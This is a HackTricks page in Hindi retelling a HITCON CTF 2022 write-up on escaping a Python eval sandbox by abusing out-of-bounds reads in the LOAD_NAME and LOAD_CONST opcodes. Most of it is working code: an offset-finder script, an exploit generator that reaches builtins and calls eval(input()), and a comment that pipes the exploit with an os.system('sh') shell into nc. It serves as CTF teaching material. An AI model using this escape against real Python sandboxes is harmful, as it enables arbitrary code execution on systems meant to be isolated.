# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**यह जानकारी ली गई थी** [**इस लेख से**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

हम LOAD_NAME / LOAD_CONST opcode में OOB read फीचर का उपयोग करके मेमोरी में कुछ प्रतीक प्राप्त कर सकते हैं। जिसका मतलब है `(a, b, c, ... सैकड़ों प्रतीक ..., __getattribute__) if [] else [].__getattribute__(...)` जैसे ट्रिक का उपयोग करके आप जिस प्रतीक (जैसे फ़ंक्शन का नाम) को चाहते हैं, उसे प्राप्त करना।

फिर बस अपने एक्सप्लॉइट को तैयार करें।

### Overview <a href="#overview-1" id="overview-1"></a>

स्रोत कोड काफी छोटा है, केवल 4 पंक्तियाँ हैं!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
आप मनमाने Python कोड को इनपुट कर सकते हैं, और इसे [Python कोड ऑब्जेक्ट](https://docs.python.org/3/c-api/code.html) में संकलित किया जाएगा। हालाँकि, उस कोड ऑब्जेक्ट के `co_consts` और `co_names` को eval करने से पहले एक खाली ट्यूपल के साथ प्रतिस्थापित किया जाएगा।

इस प्रकार, सभी अभिव्यक्तियाँ जिनमें consts (जैसे, संख्याएँ, स्ट्रिंग्स आदि) या नाम (जैसे, वेरिएबल्स, फ़ंक्शंस) शामिल हैं, अंत में सेगमेंटेशन फॉल्ट का कारण बन सकती हैं।

### आउट ऑफ बाउंड रीड <a href="#out-of-bound-read" id="out-of-bound-read"></a>

सेगफॉल्ट कैसे होता है?

आइए एक सरल उदाहरण से शुरू करते हैं, `[a, b, c]` निम्नलिखित बाइटकोड में संकलित हो सकता है।
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
लेकिन अगर `co_names` खाली ट्यूपल बन जाए? `LOAD_NAME 2` ऑपकोड अभी भी निष्पादित होता है, और उस मेमोरी पते से मान पढ़ने की कोशिश करता है जहाँ इसे मूल रूप से होना चाहिए था। हाँ, यह एक आउट-ऑफ-बाउंड पढ़ने की "विशेषता" है।

समाधान का मूल सिद्धांत सरल है। CPython में कुछ ऑपकोड जैसे `LOAD_NAME` और `LOAD_CONST` OOB पढ़ने के प्रति संवेदनशील (?) हैं।

वे `consts` या `names` ट्यूपल से `oparg` के इंडेक्स से एक ऑब्जेक्ट प्राप्त करते हैं (यही `co_consts` और `co_names` के तहत नामित हैं)। हम `LOAD_CONST` के बारे में निम्नलिखित छोटे स्निप्पेट का संदर्भ ले सकते हैं ताकि देख सकें कि CPython `LOAD_CONST` ऑपकोड को प्रोसेस करते समय क्या करता है।
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
इस तरह हम OOB फीचर का उपयोग करके मनमाने मेमोरी ऑफसेट से "name" प्राप्त कर सकते हैं। यह सुनिश्चित करने के लिए कि इसमें क्या नाम है और इसका ऑफसेट क्या है, बस `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... को आजमाते रहें। और आप लगभग oparg > 700 में कुछ पा सकते हैं। आप निश्चित रूप से gdb का उपयोग करके मेमोरी लेआउट को देखने की कोशिश कर सकते हैं, लेकिन मुझे नहीं लगता कि यह और आसान होगा?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

एक बार जब हम नामों / consts के लिए उन उपयोगी ऑफसेट को प्राप्त कर लेते हैं, तो हम उस ऑफसेट से नाम / const कैसे प्राप्त करते हैं और इसका उपयोग करते हैं? आपके लिए एक ट्रिक है:\
मान लीजिए कि हम ऑफसेट 5 (`LOAD_NAME 5`) से `__getattribute__` नाम प्राप्त कर सकते हैं जिसमें `co_names=()` है, तो बस निम्नलिखित कार्य करें:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> ध्यान दें कि इसे `__getattribute__` के रूप में नामित करना आवश्यक नहीं है, आप इसे कुछ छोटा या अजीब नाम दे सकते हैं

आप इसके बाइटकोड को देखकर इसके पीछे का कारण समझ सकते हैं:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
ध्यान दें कि `LOAD_ATTR` भी `co_names` से नाम प्राप्त करता है। यदि नाम समान है, तो Python उसी ऑफसेट से नाम लोड करता है, इसलिए दूसरा `__getattribute__` अभी भी offset=5 से लोड होता है। इस विशेषता का उपयोग करके, हम मनमाना नाम उपयोग कर सकते हैं जब नाम पास की मेमोरी में हो।

संख्याएँ उत्पन्न करना तुच्छ होना चाहिए:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

मैंने लंबाई सीमा के कारण consts का उपयोग नहीं किया।

पहले, यहाँ एक स्क्रिप्ट है जिससे हम उन नामों के ऑफसेट खोज सकें।
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
और निम्नलिखित वास्तविक Python एक्सप्लॉइट उत्पन्न करने के लिए है।
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
यह मूल रूप से निम्नलिखित चीजें करता है, उन स्ट्रिंग्स के लिए जिन्हें हम `__dir__` विधि से प्राप्त करते हैं:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{{#include ../../../banners/hacktricks-training.md}}
